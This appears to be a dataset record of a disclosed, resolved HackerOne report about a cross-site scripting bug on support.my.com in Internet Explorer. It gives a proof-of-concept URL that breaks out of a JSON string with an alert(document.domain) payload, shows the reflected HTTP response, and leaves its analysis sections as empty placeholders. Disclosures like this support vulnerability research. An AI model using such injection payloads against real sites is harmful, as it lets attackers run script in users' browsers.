---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '87806'
original_report_id: '87806'
title: '[support.my.com] Internet Explorer XSS'
weakness: Cross-site Scripting (XSS) - Generic
team_handle: mailru
created_at: '2015-09-07T07:52:19.076Z'
disclosed_at: '2016-10-06T12:22:51.121Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 4
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# [support.my.com] Internet Explorer XSS

## Metadata

- HackerOne Report ID: 87806
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: mailru
- Disclosed At: 2016-10-06T12:22:51.121Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

PoC (Internet Explorer):
`http://blackfan.ru/x?r=http://support.my.com/"-alert(document.domain)-"/%252e%252e/games`

HTTP Response:
```
   "continue":    "http://support.my.com/"-alert(document.domain)-"/%2e%2e/games",
   "signup_method":     "email,phone",
   "signup_continue":   "http://support.my.com/"-alert(document.domain)-"/%2e%2e/games"
```

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
